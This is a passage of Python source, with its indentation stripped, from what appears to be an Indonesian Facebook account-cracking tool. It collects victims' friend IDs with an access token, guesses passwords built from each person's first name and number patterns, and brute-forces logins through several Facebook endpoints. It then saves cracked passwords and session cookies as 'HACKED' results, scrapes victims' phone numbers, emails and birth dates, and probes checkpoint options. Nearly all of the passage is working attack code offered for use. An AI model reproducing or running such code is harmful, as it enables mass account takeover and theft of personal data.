except FileNotFoundError:
gada = '# DIRECTORY NOT FOUND'
sol().print(mark(gada, style = 'red'))
time.sleep(2)
back()
if len(vin) == 0:
haha = '# YOU DONT HAVE OK RESULTS'
sol().print(mark(haha, style = 'yellow'))
time.sleep(2)
back()
else :
gerr = '# YOUR OK RESULT'
sol().print(mark(gerr, style = 'green'))
cih = 0
lol = {}
for isi in vin:
try:hem = open('OK/'+isi,'r').readlines()
except:continue
cih += 1
if cih < 100:
nom = '0'+str(cih)
lol.update({
    str(cih):str(isi)})
lol.update({
    nom:str(isi)})
print('['+nom+'] '+isi+'...☠ '+str(len(hem))+' Account'+x)
else :
lol.update({
    str(cih):str(isi)})
print('['+str(cih)+'] '+isi+'...☠ '+str(len(hem))+' Account'+x)
gerr2 = '# ☠SELECT RESULTS TO DISPLAY☠'
sol().print(mark(gerr2, style = 'red'))
geeh = input(x+'['+p+'f'+x+'] Pilih : ')
try:geh = lol[geeh]
except KeyError:
ric = '# ☠OPTION NOT IN THE MENU☠'
sol().print(mark(ric, style = 'red'))
exit()
try:lin = open('OK/'+geh,'r').read()
except:
hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
sol().print(mark(hehe, style = 'red'))
time.sleep(2)
back()
akun = '# LIST YOUR OK ACCOUNT'
sol().print(mark(akun, style = 'green'))
hus = os.system('cd OK && cat '+geh)
akun2 = '# LIST YOUR OK ACCOUNT'
sol().print(mark(akun, style = 'green'))
input(x+'['+h+'•'+x+'] Return')
back()
elif kz in ['0','00']:
back()
else :
ric = '# OPTION NOT IN THE MENU'
sol().print(mark(ric, style = 'red'))
exit()

# OPEN
def file():
tek = '# CEK OPSI DARI FILE'
sol().print(mark(tek, style = 'yellow'), style = 'on yellow')
print(h+'['+h+'•'+h+'] Sedang Membaca File, Tunggu Sebentar ...')
time.sleep(2)
teks = '# PILIH FILE YG AKAN DI CEK'
sol().print(mark(teks, style = 'yellow'))
my_files = []
try:
lis = os.listdir('CP')
for kt in lis:
my_files.append(kt)
except:pass
try:
mer = os.listdir('OK')
for ty in mer:
my_files.append(ty)
except:pass
if len(my_files) == 0:
yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
sol().print(mark(yy, style = 'green'))
exit()
else :
cih = 0
lol = {}
for isi in my_files:
try:hem = open('CP/'+isi,'r').readlines()
except:
try:hem = open('OK/'+isi,'r').readlines()
except:continue
cih += 1
if cih < 10:
nom = '0'+str(cih)
lol.update({
    str(cih):str(isi)})
lol.update({
    nom:str(isi)})
print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
else :
lol.update({
    str(cih):str(isi)})
print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
teks2 = '# PILIH FILE YG AKAN DI CEK'
sol().print(mark(teks2, style = 'yellow'))
geeh = input(h+'['+h+'f'+h+'] MENU: ')
try:geh = lol[geeh]
except KeyError:
ric = '# PILIHAN TIDAK ADA DI MENU'
sol().print(mark(ric, style = 'cyan'))
exit()
try:
hf = open('CP/'+geh,'r').readlines()
for fz in hf:
akun.append(fz.replace('\n',''))
cek_opsi()
except IOError:
try:
hf = open('OK/'+geh,'r').readlines()
for fz in hf:
akun.append(fz.replace('\n',''))
cek_opsi()
except IOError:
hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
sol().print(mark(hehe, style = 'cyan'))
time.sleep(2)
back()

# DUMP ID PUBLIK
def dump_publik():
try:
token = open('.token.txt','r').read()
cok = open('.cok.txt','r').read()
except IOError:
exit()
try:
jum = int(input('>> How Many id crack 1.10 ? : '))
except ValueError:
print('choice:  ')
exit()
if jum < 1 or jum > 100:
print(' ')
exit()
ses = requests.Session()
yz = 0
for met in range(jum):
yz += 1
kl = input('  ID '+str(yz)+' : ')
uid.append(kl)
for userr in uid:
try:
col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {
    'cookies':cok
}).json()
for mi in col['friends']['data']:
try:
iso = (mi['id']+'|'+mi['name'])
if iso in id:pass
else :id.append(iso)
except:continue
except (KeyError,IOError):
pass
except requests.exceptions.ConnectionError:
print('>> Sinyal Loh Kek Kontoll ')
exit()
try:
print('')
print(f' ALL ID {
    h
}'+str(len(id)))
setting()
except requests.exceptions.ConnectionError:
print(f' {
    x
}')
print('>> Sinyal Lo kek Kontol ')
back()
except (KeyError,IOError):
print(f'>> {
    k
} Pertemanan Tidak Public {
    x
}')
time.sleep(3)
back()
# DUMP ID MASSAL
def dump_massal():
mas = '[bold cyan][01] CLONE MULTIPLE FILE\n[02] CLONE MANUAL MULTIPLE[/bold cyan]'
mas2 = nel(mas,style = 'cyan')
cetak(nel(mas2,title = 'MENU'))
pilih = input('[➣] MENU: ')
if pilih in ['1','01']:
nmfil = input(' FILE NAME : ')
nmfile = open(nmfil,'r').read().splitlines()
no = 1
for xfil in nmfile:
uid.append(xfil)
no += 1
if no == 20:
break
elif pilih in ['2','02']:
print(h+'['+h+'➣'+h+'] TOTAL LIMIT IDS [10]')
try:
jum = int(input(h+'['+h+'f'+h+'] BERAPA ID : '))
except ValueError:
pesan = '# YOU ENTERED WRONG ID'
pesan2 = mark(pesan, style = 'yellow')
sol().print(pesan2)
exit()
if jum < 1 or jum > 20:
pesan = '# OUT OF RANGE MEN'
pesan2 = mark(pesan, style = 'cyan')
sol().print(pesan2)
exit()
ses = requests.Session()
yz = 0
print(h+'['+h+'➣'+h+'] DO YOU WANT TO CLONE FROM FRIEND LIST')
for met in range(jum):
yz += 1
kl = input(h+'['+h+str(yz)+h+'] ENTER ID '+str(yz)+' : ')
uid.append(kl)
sed = '# Tunggu Sedang Mengumpulkan ID  '
sol().print(mark(sed, style = 'yellow'))
ses = requests.Session()
for userr in uid:
try:
col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
for mi in col['friends']['data']:
try:
iso = (mi['id']+'|'+mi['name'])
if iso in id:pass
else :id.append(iso)
except:continue
except (KeyError,IOError):
pass
except requests.exceptions.ConnectionError:
li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
lo = mark(li, style = 'yellow')
sol().print(lo, style = 'purple')
exit()
tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
if len(id) == 0:
tot2 = mark(tot, style = 'purple')
else :
tot2 = mark(tot, style = 'yellow')
sol().print(tot2)
setting()


# PENGAT7URAN ID
def setting():
wl = '# FREE FOR ALL'
sol().print(mark(wl, style = 'yellow'))
teks = '[bold yellow][01] Crack OLD ID\n[02] Crack New ID\n[03] Crack Random ID[/bold yellow]'
tak = nel(teks, style = 'yellow')
cetak(nel(tak, title = '☠'))
hu = input(h+''+h+'☠'+h+' CHOOSE : ')
if hu in ['1','01']:
for tua in sorted(id):
id2.append(tua)

elif hu in ['2','02']:
muda = []
for bacot in sorted(id):
muda.append(bacot)
bcm = len(muda)
bcmi = (bcm-1)
for xmud in range(bcm):
id2.append(muda[bcmi])
bcmi -= 1
elif hu in ['3','03']:
for bacot in id:
xx = random.randint(0,len(id2))
id2.insert(xx,bacot)
else :
ric = '# PILIHAN TIDAK ADA DI MENU'
sol().print(mark(ric, style = 'green'))
exit()
met = '# ☟'
sol().print(mark(met, style = 'white'))
ioz = '[bold green][01] Api-Mobile\n[02] Api-FreeMod\n[03] B-api[/bold green]'
gess = nel(ioz, style = 'yellow')
cetak(nel(gess, title = ''))
hc = input(h+'['+h+'f'+h+'] MENU : ')
if hc in ['1','01']:
method.append('mobile')
elif hc in ['2','02']:
method.append('free')
elif hc in ['3','03']:
method.append('mbasic')
else :
method.append('mobile')
guw = '#'
sol().print(mark(guw, style = 'white'))
aplik = input(h+'['+h+'f'+h+'] APP YOURE ADD ? (y/t) : ')
if aplik in ['y','Y']:
taplikasi.append('ya')
else :
taplikasi.append('no')
osk = input(h+'['+h+'f'+h+'] PASSWORD YOURE ADD(y/t) : ')
if osk in ['y','Y']:
oprek.append('ya')
else :
oprek.append('no')
passwrd()

# WORDLIST
def passwrd():
ler = '#:::::::::::::::::::_______      _______::::::::::::::::::::'
sol().print(mark(ler, style = 'white'))
krek = 'Live Results Saved To : HACKED/%s\nCheck Result Saved To : CP/%s\nTurn on/your Airplane Mode Every 10MIN'%(okc,cpc)
cetak(nel(krek, title = 'CRACK'))
with tred(max_workers = 30) as pool:
for yuzong in id2:
idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
frs = nmf.split(' ')[0]
pwv = ['112233','12341234','11223344','123456789','123','1122334455','12345']
if len(nmf) < 6:
if len(frs) < 3:
pass
else :
pwv.append(frs+'123')
pwv.append(frs+'1123')
pwv.append(kura+'1234')
pwv.append(frs+'12345')
pwv.append(frs+'112233')
pwv.append(frs+'445566')
pwv.append(frs+'12345678')
pwv.append(frs+'112')
pwv.append(frs+'112345')
pwv.append(frs+'1999')
pwv.append(frs+'1992')
pwv.append(frs+'1993')
pwv.append(frs+'1994')
pwv.append(frs+'1995')
pwv.append(frs+'1996')
pwv.append(frs+'1997')
pwv.append(frs+'1998')
pwv.append(frs+'2000')
pwv.append(frs+'8910')
pwv.append(frs+'1234566')
pwv.append(frs+'1120233')
pwv.append(frs+'2001')
pwv.append(frs+'2002')
pwv.append(frs+'2003')
pwv.append(frs+'2004')
pwv.append(frs+'2005')
pwv.append(frs+'2006')
pwv.append(frs+'2010')
pwv.append(frs+'2011')
pwv.append(frs+'2012')
pwv.append(frs+'2017')
pwv.append(frs+'11')
pwv.append(frs+'22')
pwv.append(frs+'33')
pwv.append(frs+'12')
pwv.append(frs+'123455')
pwv.append(frs+'123321')
pwv.append(frs+'88888888')
pwv.append(frs+'1234433')
pwv.append(frs+'0000')
pwv.append(frs+'3333')
pwv.append(frs+'543211')
pwv.append(frs+'080808')
pwv.append(frs+'263519')
pwv.append(frs+'362519')
pwv.append(frs+'363519')
pwv.append(frs+'0750')
pwv.append(frs+'156432')
else :
if len(frs) < 3:
pwv.append(nmf)
else :
pwv.append(nmf)
pwv.append(frs+'123')
pwv.append(frs+'1234')
pwv.append(frs+'12345')
pwv.append(frs+'123456')
pwv.append(frs+'1234567')
pwv.append(frs+'12345678')
pwv.append(frs+'112')
pwv.append(frs+'786786')
if 'mobile' in method:
pool.submit(crack,idf,pwv)
elif 'api' in method:
pool.submit(crack2,idf,pwv)
elif 'free' in method:
pool.submit(crack3,idf,pwv)
else :
pool.submit(crack,idf,pwv)
print('')
tanya = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
sol().print(mark(tanya, style = 'green'))
woi = input(x+'['+p+'☠'+x+']  (y/t) : ')
if woi in ['y','Y']:
cek_opsi()
else :
exit()

# CRACKER
def crack(idf,pwv):
global loop,ok,cp
bi = random.choice([u,k,kk,b,h,hh])
pers = loop*100/len(id2)
fff = '%'
print('\r%s CRACK------> %s/%s ------> ibo:%s --------> mja:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end = ' ');sys.stdout.flush()
ua = random.choice(ugen)
ua2 = random.choice(ugen2)
ses = requests.Session()
for pw in pwv:
try:
tix = time.time()
ses.headers.update({
    "Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
})
p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
dataa = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"
}
ses.headers.update({
    "Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https:/m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
})
po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data = dataa,allow_redirects = False)
if "checkpoint" in po.cookies.get_dict().keys():
if 'ya' in oprek:
akun.append(idf+'|'+pw)
ceker(idf,pw)
else :
print('\n')
statuscp = f'[HACKED] ID: {
    idf
}  PASS: {
    pw
}'
statuscp1 = nel(statuscp, style = 'red')
cetak(nel(statuscp1, title = 'CP'))
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp += 1
break
elif "c_user" in ses.cookies.get_dict().keys():
headapp = {
    "user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"
}
if 'no' in taplikasi:
ok += 1
coki = po.cookies.get_dict()
kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
print('\n')
statusok = f'[HACKED] ID: {
    idf
}\n PASS: {
    pw
}\n'
statusok1 = nel(statusok, style = 'green')
cetak(nel(statusok1, title = 'OK'))
break
elif 'ya' in taplikasi:
ok += 1
coki = po.cookies.get_dict()
kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
user = idf
infoakun = ""
session = requests.Session()
get_id = session.get("https://mbasic.facebook.com/profile.php",cookies = coki,headers = headapp).text
nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies = coki,headers = headapp).text
response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies = coki,headers = headapp).text
response3 = session.get(f"https://free.facebook.com/ {
    user
}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies = coki,headers = headapp).text
response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token= {
    user
}%3A184985071538002%3A32&_rdc=1&_rdr",cookies = coki,headers = headapp).text
try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
except:nomer = ""
try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
except:email = ""
try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
except:ttl = ""
try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
except:teman = ""
try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
except:pengikut = ""
try:
tahun = ""
cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
for nenen in cek_thn:
tahun += nenen+", "
except:pass

infoakun += (f"[✓] Account name       : {
    nama
}\n[✓] Number of Friends    : {
    teman
}\n[✓] Number of Followers : {
    pengikut
}\n[✓] Active Email            : {
    email
}\n[✓] Active Number             : {
    nomer
}\n[✓] Account Year              : {
    tahun
}\n[✓] Date of birth   : {
    ttl
}\n")

hit1, hit2 = 0,0
cek = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies = coki,headers = headapp).text
cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies = coki,headers = headapp).text
if "Accessed using Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
infoakun += (f"Related Apps*\n")
if "You don't have an active app or website to review." in cek:
infoakun += (f"No Active Apps Associated *\n")
else :
infoakun += (f"	Active Apps : \n")
apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
for muncul in apkAktif:
hit1 += 1
infoakun += (f"		[ {
    hit1
}] {
    muncul
} {
    ditambahkan[hit2]}\n")
hit2 += 1
if "You don't have expired apps or websites to review" in cek2:
infoakun += (f"\nNo Expired Apps Associated\n")
else :
hit1,hit2 = 0,0
infoakun += (f"	Expired Apps :\n")
apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
for muncul in apkKadaluarsa:
hit1 += 1
infoakun += (f"		[ {
    hit1
}] {
    muncul
} {
    kadaluarsa[hit2]}\n")
hit2 += 1
else :pass
print('\n')
statusok = f'[HACKED) ID: {
    idf
}\n PASS: {
    pw
}\n {
    infoakun
}'
statusok1 = nel(statusok, style = 'green')
cetak(nel(statusok1, title = 'OK'))
break


else :
continue
except requests.exceptions.ConnectionError:
time.sleep(31)
loop += 1

# CRACKER2
def crack2(idf,pwv):
global loop,ok,cp
bi = random.choice([u,k,kk,b,h,hh])
pers = loop*100/len(id2)
fff = '%'
print('\r%sMRX-ENGINE-START %s/%s Ok*%s CP *%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end = ' ');sys.stdout.flush()
ua = random.choice(ugen).replace('\n','')
ses = requests.Session()
for pw in pwv:
try:
head = {
    "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"
}
resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers = head)
if "mbasic.facebook.com" in resp.json()["error_msg"]:
if 'ya' in oprek:
akun.append(idf+'|'+pw)
ceker(idf,pw)
else :
print('\r%s++ %s|%s ----> CP       '%(b,idf,pw))
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp += 1
break
elif "session_key" in resp.text and "EAAA" in resp.text:
print('\r%s++ %s|%s ----> OK       '%(h,idf,pw))
open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
ok += 1
break
else :
continue
except requests.exceptions.ConnectionError:
time.sleep(31)
loop += 1

def crack3(idf,pwv):
global loop,ok,cp
bi = random.choice([u,k,kk,b,h,hh])
pers = loop*100/len(id2)
fff = '%'
print('\r%s %s/%s  HACKED:%s | CP:%s | %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end = ' ');sys.stdout.flush()
ua = random.choice(ugen)
ua2 = random.choice(ugen2)
ses = requests.Session()
for pw in pwv:
try:
tix = time.time()
ses.headers.update({
    "Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
})
p = ses.get('https://free.facebook.com/login/?email='+idf).text
dataa = {
    'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
    'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
    'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
    'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
    'email':idf,
    'pass':pw
}
ses.headers.update({
    'Host': 'free.facebook.com',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'origin': 'https://mbasic.facebook.com',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': ua,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-user': 'empty',
    'sec-fetch-dest': 'document',
    'referer': 'https://mbasic.facebook.com/'+idf,
    'accept-encoding':'gzip, deflate br',
    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'
})

po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data = dataa,allow_redirects = False)
if "checkpoint" in po.cookies.get_dict().keys():
if 'ya' in oprek:
akun.append(idf+'|'+pw)
ceker(idf,pw)
else :
print('\n')
statuscp = f'[•] ID: {
    idf
} [•] PASSWORD: {
    pw
}'
statuscp1 = nel(statuscp, style = 'red')
cetak(nel(statuscp1, title = 'CP'))
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp += 1
break
elif "c_user" in ses.cookies.get_dict().keys():
if 'no'in taplikasi:
ok += 1
coki = po.cookies.get_dict()
kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
print('\n')
statusok = f'[•] ID: {
    idf
}\n[•] PASSWORD: {
    pw
}\n[•] COOKIES: {
    kuki
}'
statusok1 = nel(statusok, style = 'red')
cetak(nel(statusok1, title = 'OK'))
break
elif 'ya'in taplikasi:
ok += 1
coki = po.cookies.get_dict()
kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
user = idf
infoakun = ""
session = requests.Session()
get_id = session.get("https://mbasic.facebook.com/profile.php",cookies = coki).text
nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies = coki).text
response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies = coki).text
response3 = session.get(f"https://mbasic.facebook.com/ {
    user
}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies = coki).text
response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token= {
    user
}%3A184985071538002%3A32&_rdc=1&_rdr",cookies = coki).text
try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
except:nomer = ""
try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
except:email = ""
try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
except:ttl = ""
try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
except:teman = ""
try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
except:pengikut = ""
try:
tahun = ""
cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
for nenen in cek_thn:
tahun += nenen+", "
except:pass

infoakun += (f"[✓] Account name       : {
    nama
}\n[✓] Number of Friends    : {
    teman
}\n[✓] Number of Followers : {
    pengikut
}\n[✓] Active Email     : {
    email
}\n[✓] Active Number     : {
    nomer
}\n[✓] Account Year      : {
    tahun
}\n[✓] Date of birth   : {
    ttl
}\n")

hit1, hit2 = 0,0
cek = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies = coki).text
cek2 = session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies = coki).text
if "Accessed using Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
infoakun += (f"Related Apps*\n")
if "You don't have an active app or website to review." in cek:
infoakun += (f"No Active Apps Associated *\n")
else :
infoakun += (f"	Active Apps : \n")
apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
for muncul in apkAktif:
hit1 += 1
infoakun += (f"		[ {
    hit1
}] {
    muncul
} {
    ditambahkan[hit2]}\n")
hit2 += 1
if "You don't have expired apps or websites to review" in cek2:
infoakun += (f"\nNo Expired Apps Associated\n")
else :
hit1,hit2 = 0,0
infoakun += (f"	Expired Apps :\n")
apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
for muncul in apkKadaluarsa:
hit1 += 1
infoakun += (f"		[ {
    hit1
}] {
    muncul
} {
    kadaluarsa[hit2]}\n")
hit2 += 1
else :pass
print('\n')
statusok = f'[•] ID       : {
    idf
}\n[•] PASSWORD : {
    pw
}\n[•] COOKIES  : {
    kuki
}\n {
    infoakun
}'
statusok1 = nel(statusok, style = 'green')
cetak(nel(statusok1, title = 'OK'))
break

else :
continue
except requests.exceptions.ConnectionError:
time.sleep(31)
loop += 1

# OPSI
def ceker(idf,pw):
global cp
ua = 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'
head = {
    "Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
ses = requests.Session()
try:
hi = ses.get('https://mbasic.facebook.com')
ho = sop(ses.post('https://free.facebook.com/login.php', data = {
    'email':idf,'pass':pw,'login':'submit'
}, headers = head, allow_redirects = True).text,'html.parser')
jo = ho.find('form')
data = {}
lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
for anj in jo('input'):
if anj.get('name') in lion:
data.update({
    anj.get('name'):anj.get('value')})
kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data = data, headers = head).text,'html.parser')
print('\r%s++ %s|%s ----> CP       %s'%(b,idf,pw,x))
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
cp += 1
opsi = kent.find_all('option')
if len(opsi) == 0:
print('\r%s---> Tap Yes / A2F (Check Login In Lite/Mbasic%s)'%(hh,x))
else :
for opsii in opsi:
print('\r%s---> %s%s'%(kk,opsii.text,x))
except Exception as c:
print('\r%s++ %s|%s ----> CP       %s'%(b,idf,pw,x))
print('\r%s---> Cannot Check Options (Check Login In Lite/Mbasic)%s'%(u,x))
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
cp += 1

# OPSI CEKER
def cek_opsi():
c = len(akun)
hu = 'There is %s Account To Check\nBefore Start, Airplane Mode/Change Sim Card First'%(c)
cetak(nel(hu, title = 'CEK OPSI'))
input(x+'['+h+'•'+x+'] Start')
cek = '# OPTION CHECK PROCESS START'
sol().print(mark(cek, style = 'green'))
love = 0
